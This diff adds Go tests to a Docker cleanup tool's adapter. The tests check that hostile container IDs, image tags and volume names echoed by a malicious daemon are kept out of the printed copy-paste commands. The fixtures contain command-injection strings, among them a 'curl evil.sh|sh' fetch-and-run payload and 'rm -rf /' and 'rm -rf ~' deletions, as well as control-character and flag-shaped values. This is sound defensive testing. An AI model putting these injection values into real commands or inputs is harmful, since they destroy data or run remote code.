@@ -2,8 +2,10 @@ package dockeradapter
 
 import (
 	"context"
+	"fmt"
 	"os"
 	"path/filepath"
+	"regexp"
 	"strings"
 	"testing"
 	"time"
@@ -539,4 +541,402 @@ func itemIDs2(rep DockerReport) []int {
 
 func isWindowsHost() bool {
 	return windowsHostCheck()
+}
+
+// ---- hostile daemon identifiers (W2-1) ----------------------------------
+//
+// A hostile DOCKER_HOST endpoint can echo any identifier shape; these
+// fixtures drive every tier whose CopyCommand embeds daemon-sourced
+// ids/refs/names (2, 3, 4, 6) and assert the hostile value never lands
+// in the printed command, while the item stays visible behind the
+// unparseable-identifier shield.
+
+// hostileIDPayloads are daemon-echoed container/image id shapes. None
+// may be sliced by shortID and embedded in copyable command text.
+var hostileIDPayloads = []string{
+	"sha256:;curl evil.sh|sh;aaaa", // command injection via the slice
+	"sha256:abc\ndef1234567890",    // newline (visual spoofing)
+	"sha256:-abc123def4567",        // leading dash (flag-shaped)
+	"sha256:\x1b[31mevil\x1b[0mab", // ANSI escape
+	"",                             // empty
+}
+
+// hostileRefPayloads are daemon-echoed repository/tag shapes for tier 4.
+var hostileRefPayloads = []struct{ repo, tag string }{
+	{"postgres", "14;rm -rf /"},
+	{"postgres", "14\npwned"},
+	{"postgres", "-pwned"},
+	{"postgres", "14\x1b[31m"},
+	{"ghcr.io/x; rm -rf /", ""},
+}
+
+// hostileVolumeNames are daemon-echoed volume names for tier 6.
+var hostileVolumeNames = []string{
+	"x; rm -rf ~",
+	"bad\nname",
+	"-evil",
+	"bad\x1b[31mname",
+	"",
+}
+
+// assertNoControlChars fails when a rendered string still carries
+// newline/CR/tab/ESC/DEL bytes after sanitizeDisplay.
+func assertNoControlChars(t *testing.T, where, s string) {
+	t.Helper()
+	for i := 0; i < len(s); i++ {
+		if c := s[i]; c < 0x20 || c == 0x7f {
+			t.Errorf("%s %q contains control char 0x%02x at offset %d", where, s, c, i)
+		}
+	}
+}
+
+// assertUnparseableShield fails unless the item is shielded as
+// unparseable and marked for manual inspection only.
+func assertUnparseableShield(t *testing.T, it DockerItem) {
+	t.Helper()
+	if !strings.Contains(it.Shield, "unparseable") || !strings.Contains(it.Shield, "manual inspection") {
+		t.Fatalf("hostile identifier must be shielded as unparseable for manual inspection: %+v", it)
+	}
+}
+
+// ---- fixture builders shared by the shield tests and the belt -----------
+
+// zombieRow is an exited compose container whose working dir is wd.
+func zombieRow(id, wd string) map[string]any {
+	return map[string]any{"ID": id, "Names": "z-1", "Image": "goneproj-web:latest",
+		"State": "exited", "Status": "Exited (0) 4 weeks ago",
+		"Labels": map[string]any{
+			"com.docker.compose.project":             "goneproj",
+			"com.docker.compose.project.working_dir": wd,
+		}}
+}
+
+// coldImageRow is a >60d image name-correlated to a dormant workspace.
+func coldImageRow(t *testing.T, id string) map[string]any {
+	t.Helper()
+	return map[string]any{"ID": id, "Repository": "coldproj-web", "Tag": "latest",
+		"Size": float64(1 << 30), "CreatedAt": oldISO(t, 90)}
+}
+
+// upstreamRow is a >60d upstream-shaped image row.
+func upstreamRow(t *testing.T, seed int, repo, tag string) map[string]any {
+	t.Helper()
+	return map[string]any{"ID": "sha256:" + hex64(seed), "Repository": repo, "Tag": tag,
+		"Size": float64(1 << 30), "CreatedAt": oldISO(t, 90)}
+}
+
+// composeVolumeRow is a named compose volume whose project dir is wd.
+func composeVolumeRow(name, wd string) map[string]any {
+	return map[string]any{"Name": name, "Driver": "local", "Links": float64(0),
+		"Labels": map[string]any{
+			"com.docker.compose.project":           "goneproj",
+			"com.docker.compose.projectworkingdir": wd,
+		}}
+}
+
+// ---- tier 2 hostile ids ---------------------------------------------------
+
+func TestTier2HostileIDShieldedOutOfCommand(t *testing.T) {
+	base := t.TempDir()
+	deletedDir := filepath.Join(base, "goneproj")
+	for i, hostile := range hostileIDPayloads {
+		t.Run(fmt.Sprintf("payload #%d", i), func(t *testing.T) {
+			scenario := mergeScenario(baseScenario(),
+				fakeCmd([]string{"ps", "-a"}, map[string]any{"rc": 0, "stdout": ndjson(
+					zombieRow(hostile, deletedDir))}))
+			e, _ := newTestEngine(t, scenario)
+			rep, err := e.Report(context.Background(), nil)
+			if err != nil {
+				t.Fatalf("Report: %v", err)
+			}
+			t2 := tierOf(t, rep, 2)
+			if len(t2.Items) != 1 {
+				t.Fatalf("tier 2 items = %v, want the single hostile candidate", itemIDs(t2))
+			}
+			it := t2.Items[0]
+			assertUnparseableShield(t, it)
+			if t2.CopyCommand != "" {
+				t.Fatalf("tier 2 must withhold the command entirely: %q", t2.CopyCommand)
+			}
+			assertNoControlChars(t, "ID", it.ID)
+			assertNoControlChars(t, "Detail", it.Detail)
+			assertNoControlChars(t, "Shield", it.Shield)
+		})
+	}
+
+	// Mixed: the clean sibling stays recommended, the hostile id withheld.
+	scenario := mergeScenario(baseScenario(),
+		fakeCmd([]string{"ps", "-a"}, map[string]any{"rc": 0, "stdout": ndjson(
+			zombieRow("sha256:"+hex64(1), deletedDir),
+			zombieRow("sha256:;rm -rf /", deletedDir))}))
+	e, _ := newTestEngine(t, scenario)
+	rep, err := e.Report(context.Background(), nil)
+	if err != nil {
+		t.Fatalf("Report: %v", err)
+	}
+	t2 := tierOf(t, rep, 2)
+	if want := "docker rm " + hex64(1)[:12]; t2.CopyCommand != want {
+		t.Fatalf("tier 2 command = %q, want clean-id-only %q", t2.CopyCommand, want)
+	}
+	assertUnparseableShield(t, findItem(t, t2, "rm -rf"))
+}
+
+// ---- tier 3 hostile ids ---------------------------------------------------
+
+func TestTier3HostileIDShieldedOutOfCommand(t *testing.T) {
+	base := t.TempDir()
+	coldDir := filepath.Join(base, "coldproj")
+	if err := os.MkdirAll(coldDir, 0o755); err != nil {
+		t.Fatal(err)
+	}
+	touchAge(t, coldDir, 120*24*time.Hour) // dormant workspace
+
+	for i, hostile := range hostileIDPayloads {
+		t.Run(fmt.Sprintf("payload #%d", i), func(t *testing.T) {
+			scenario := mergeScenario(baseScenario(),
+				fakeCmd([]string{"image", "ls"}, map[string]any{"rc": 0, "stdout": ndjson(
+					coldImageRow(t, hostile))}))
+			e, _ := newTestEngine(t, scenario)
+			rep, err := e.Report(context.Background(), []string{coldDir})
+			if err != nil {
+				t.Fatalf("Report: %v", err)
+			}
+			t3 := tierOf(t, rep, 3)
+			if len(t3.Items) != 1 {
+				t.Fatalf("tier 3 items = %v, want the single hostile candidate", itemIDs(t3))
+			}
+			it := t3.Items[0]
+			assertUnparseableShield(t, it)
+			if t3.CopyCommand != "" {
+				t.Fatalf("tier 3 must withhold the command entirely: %q", t3.CopyCommand)
+			}
+			assertNoControlChars(t, "ID", it.ID)
+			assertNoControlChars(t, "Detail", it.Detail)
+			assertNoControlChars(t, "Shield", it.Shield)
+		})
+	}
+
+	// Mixed: exact freeze command over the clean id only.
+	scenario := mergeScenario(baseScenario(),
+		fakeCmd([]string{"image", "ls"}, map[string]any{"rc": 0, "stdout": ndjson(
+			coldImageRow(t, "sha256:"+hex64(1)),
+			coldImageRow(t, "sha256:;rm -rf /"))}))
+	e, _ := newTestEngine(t, scenario)
+	rep, err := e.Report(context.Background(), []string{coldDir})
+	if err != nil {
+		t.Fatalf("Report: %v", err)
+	}
+	t3 := tierOf(t, rep, 3)
+	if want := freezePlaceholder + " " + hex64(1)[:12]; t3.CopyCommand != want {
+		t.Fatalf("tier 3 command = %q, want clean-id-only %q", t3.CopyCommand, want)
+	}
+	assertUnparseableShield(t, findItem(t, t3, "rm -rf"))
+}
+
+// ---- tier 4 hostile refs --------------------------------------------------
+
+func TestTier4HostileRefShieldedOutOfCommand(t *testing.T) {
+	for i, p := range hostileRefPayloads {
+		t.Run(fmt.Sprintf("payload #%d", i), func(t *testing.T) {
+			scenario := mergeScenario(baseScenario(),
+				fakeCmd([]string{"image", "ls"}, map[string]any{"rc": 0, "stdout": ndjson(
+					upstreamRow(t, 1, p.repo, p.tag))}))
+			e, _ := newTestEngine(t, scenario)
+			rep, err := e.Report(context.Background(), nil)
+			if err != nil {
+				t.Fatalf("Report: %v", err)
+			}
+			t4 := tierOf(t, rep, 4)
+			if len(t4.Items) != 1 {
+				t.Fatalf("tier 4 items = %v, want the single hostile candidate", itemIDs(t4))
+			}
+			it := t4.Items[0]
+			assertUnparseableShield(t, it)
+			if t4.CopyCommand != "" {
+				t.Fatalf("tier 4 must withhold the command entirely: %q", t4.CopyCommand)
+			}
+			assertNoControlChars(t, "ID", it.ID)
+			assertNoControlChars(t, "Detail", it.Detail)
+			assertNoControlChars(t, "Shield", it.Shield)
+		})
+	}
+
+	// Mixed: exact rmi command over the clean ref only.
+	scenario := mergeScenario(baseScenario(),
+		fakeCmd([]string{"image", "ls"}, map[string]any{"rc": 0, "stdout": ndjson(
+			upstreamRow(t, 1, "postgres", "14"),
+			upstreamRow(t, 2, "postgres", "14;rm -rf /"))}))
+	e, _ := newTestEngine(t, scenario)
+	rep, err := e.Report(context.Background(), nil)
+	if err != nil {
+		t.Fatalf("Report: %v", err)
+	}
+	t4 := tierOf(t, rep, 4)
+	if want := "docker rmi postgres:14"; t4.CopyCommand != want {
+		t.Fatalf("tier 4 command = %q, want clean-ref-only %q", t4.CopyCommand, want)
+	}
+	if len(t4.Items) != 2 {
+		t.Fatalf("tier 4 items = %v, want clean + hostile", itemIDs(t4))
+	}
+	assertUnparseableShield(t, t4.Items[1])
+}
+
+// ---- tier 6 hostile names -------------------------------------------------
+
+func TestTier6HostileNameShieldedOutOfCommand(t *testing.T) {
+	base := t.TempDir()
+	deletedDir := filepath.Join(base, "goneproj")
+	for i, hostile := range hostileVolumeNames {
+		t.Run(fmt.Sprintf("payload #%d", i), func(t *testing.T) {
+			scenario := mergeScenario(baseScenario(),
+				fakeCmd([]string{"volume", "ls"}, map[string]any{"rc": 0, "stdout": ndjson(
+					composeVolumeRow(hostile, deletedDir))}))
+			e, _ := newTestEngine(t, scenario)
+			rep, err := e.Report(context.Background(), nil)
+			if err != nil {
+				t.Fatalf("Report: %v", err)
+			}
+			t6 := tierOf(t, rep, 6)
+			if len(t6.Items) != 1 {
+				t.Fatalf("tier 6 items = %v, want the single hostile candidate", itemIDs(t6))
+			}
+			it := t6.Items[0]
+			assertUnparseableShield(t, it)
+			if t6.CopyCommand != "" {
+				t.Fatalf("tier 6 must withhold the command entirely: %q", t6.CopyCommand)
+			}
+			assertNoControlChars(t, "ID", it.ID)
+			assertNoControlChars(t, "Detail", it.Detail)
+			assertNoControlChars(t, "Shield", it.Shield)
+		})
+	}
+
+	// Mixed: exact volume rm command over the clean name only.
+	scenario := mergeScenario(baseScenario(),
+		fakeCmd([]string{"volume", "ls"}, map[string]any{"rc": 0, "stdout": ndjson(
+			composeVolumeRow("goneproj_db-data", deletedDir),
+			composeVolumeRow("x; rm -rf ~", deletedDir))}))
+	e, _ := newTestEngine(t, scenario)
+	rep, err := e.Report(context.Background(), nil)
+	if err != nil {
+		t.Fatalf("Report: %v", err)
+	}
+	t6 := tierOf(t, rep, 6)
+	if want := "docker volume rm goneproj_db-data"; t6.CopyCommand != want {
+		t.Fatalf("tier 6 command = %q, want clean-name-only %q", t6.CopyCommand, want)
+	}
+	assertUnparseableShield(t, findItem(t, t6, "rm -rf"))
+}
+
+// ---- safe-charset belt ----------------------------------------------------
+
+// safeCopyCommandRe is the belt over every daemon-parameterized
+// CopyCommand: a fixed verb followed by tokens drawn solely from a
+// metacharacter-free charset (no ;&|><$"'` backtick, no !, no glob
+// characters, no whitespace beyond single separators, no control
+// characters) and never dash-leading (the CLI would read a flag). The
+// optional tail is joinIDs' own fixed overflow marker. Fixed native
+// commands (tiers 0/1/5) are exempt: they embed no daemon value.
+var safeCopyCommandRe = regexp.MustCompile(
+	`^(?:docker (?:rm|rmi|volume rm)|ebb freeze) [A-Za-z0-9][A-Za-z0-9_:./@=+#-]*(?: [A-Za-z0-9][A-Za-z0-9_:./@=+#-]*)*` +
+		`(?:  # \+[0-9]+ more: rerun ebb analyse after this batch)?$`)
+
+// beltCase is one fake-daemon fixture whose report the belt scans.
+type beltCase struct {
+	name     string
+	scenario map[string]any
+	roots    []string
+}
+
+func TestEveryCopyCommandMatchesSafeCharset(t *testing.T) {
+	base := t.TempDir()
+	coldDir := filepath.Join(base, "coldproj")
+	deletedDir := filepath.Join(base, "goneproj")
+	if err := os.MkdirAll(coldDir, 0o755); err != nil {
+		t.Fatal(err)
+	}
+	touchAge(t, coldDir, 120*24*time.Hour)
+
+	// One clean matrix exercising every tier with well-formed ids: the
+	// commands must keep their exact pre-fix shapes AND pass the belt.
+	cleanRich := mergeScenario(baseScenario(),
+		fakeCmd([]string{"image", "ls"}, map[string]any{"rc": 0, "stdout": ndjson(
+			map[string]any{"ID": "sha256:" + hex64(1), "Repository": "<none>", "Tag": "<none>",
+				"Size": float64(1 << 20), "CreatedAt": oldISO(t, 90)},
+			upstreamRow(t, 2, "postgres", "14"),
+			coldImageRow(t, "sha256:"+hex64(3)))}),
+		fakeCmd([]string{"ps", "-a"}, map[string]any{"rc": 0, "stdout": ndjson(
+			zombieRow("sha256:"+hex64(4), deletedDir))}),
+		fakeCmd([]string{"volume", "ls"}, map[string]any{"rc": 0, "stdout": ndjson(
+			map[string]any{"Name": hex64(5), "Driver": "local", "Links": float64(0)},
+			composeVolumeRow("goneproj_db-data", deletedDir))}),
+		fakeCmd([]string{"buildx", "du"}, map[string]any{"rc": 0, "stdout": ndjson(
+			map[string]any{"ID": "sha256:" + hex64(6), "LastUsedAt": oldISO(t, 30),
+				"RecordType": "exec.cachemount", "Usage": map[string]any{"Size": float64(1 << 30)}})}),
+	)
+
+	cases := []beltCase{{name: "clean rich matrix", scenario: cleanRich, roots: []string{coldDir}}}
+	for i, h := range hostileIDPayloads {
+		cases = append(cases,
+			beltCase{name: fmt.Sprintf("tier2 hostile #%d", i), scenario: mergeScenario(baseScenario(),
+				fakeCmd([]string{"ps", "-a"}, map[string]any{"rc": 0, "stdout": ndjson(
+					zombieRow(h, deletedDir))}))},
+			beltCase{name: fmt.Sprintf("tier2 mixed #%d", i), scenario: mergeScenario(baseScenario(),
+				fakeCmd([]string{"ps", "-a"}, map[string]any{"rc": 0, "stdout": ndjson(
+					zombieRow("sha256:"+hex64(7), deletedDir), zombieRow(h, deletedDir))}))},
+			beltCase{name: fmt.Sprintf("tier3 hostile #%d", i), roots: []string{coldDir},
+				scenario: mergeScenario(baseScenario(),
+					fakeCmd([]string{"image", "ls"}, map[string]any{"rc": 0, "stdout": ndjson(
+						coldImageRow(t, h))}))},
+			beltCase{name: fmt.Sprintf("tier3 mixed #%d", i), roots: []string{coldDir},
+				scenario: mergeScenario(baseScenario(),
+					fakeCmd([]string{"image", "ls"}, map[string]any{"rc": 0, "stdout": ndjson(
+						coldImageRow(t, "sha256:"+hex64(8)), coldImageRow(t, h))}))})
+	}
+	for i, p := range hostileRefPayloads {
+		cases = append(cases,
+			beltCase{name: fmt.Sprintf("tier4 hostile #%d", i), scenario: mergeScenario(baseScenario(),
+				fakeCmd([]string{"image", "ls"}, map[string]any{"rc": 0, "stdout": ndjson(
+					upstreamRow(t, 9, p.repo, p.tag))}))},
+			beltCase{name: fmt.Sprintf("tier4 mixed #%d", i), scenario: mergeScenario(baseScenario(),
+				fakeCmd([]string{"image", "ls"}, map[string]any{"rc": 0, "stdout": ndjson(
+					upstreamRow(t, 10, "postgres", "14"), upstreamRow(t, 11, p.repo, p.tag))}))})
+	}
+	for i, h := range hostileVolumeNames {
+		cases = append(cases,
+			beltCase{name: fmt.Sprintf("tier6 hostile #%d", i), scenario: mergeScenario(baseScenario(),
+				fakeCmd([]string{"volume", "ls"}, map[string]any{"rc": 0, "stdout": ndjson(
+					composeVolumeRow(h, deletedDir))}))},
+			beltCase{name: fmt.Sprintf("tier6 mixed #%d", i), scenario: mergeScenario(baseScenario(),
+				fakeCmd([]string{"volume", "ls"}, map[string]any{"rc": 0, "stdout": ndjson(
+					composeVolumeRow("goneproj_db-data", deletedDir), composeVolumeRow(h, deletedDir))}))})
+	}
+
+	checked := 0
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			e, _ := newTestEngine(t, tc.scenario)
+			rep, err := e.Report(context.Background(), tc.roots)
+			if err != nil {
+				t.Fatalf("Report: %v", err)
+			}
+			for _, tr := range rep.Tiers {
+				switch tr.CopyCommand {
+				case "", cmdImagePrune, cmdVolumePrune, cmdImagePrune + " && " + cmdVolumePrune, cmdBuilderPrune:
+					// Withheld or fixed native forms embedding no daemon value.
+				default:
+					checked++
+					if !safeCopyCommandRe.MatchString(tr.CopyCommand) {
+						t.Errorf("tier %d CopyCommand %q violates the safe-charset belt", tr.Tier, tr.CopyCommand)
+					}
+				}
+			}
+			if rep.SlackCommand != "" && rep.SlackCommand != cmdHostSlack {
+				t.Errorf("unexpected SlackCommand %q", rep.SlackCommand)
+			}
+		})
+	}
+	if checked == 0 {
+		t.Fatal("belt was vacuous: no daemon-parameterized CopyCommand exercised")
+	}
 }
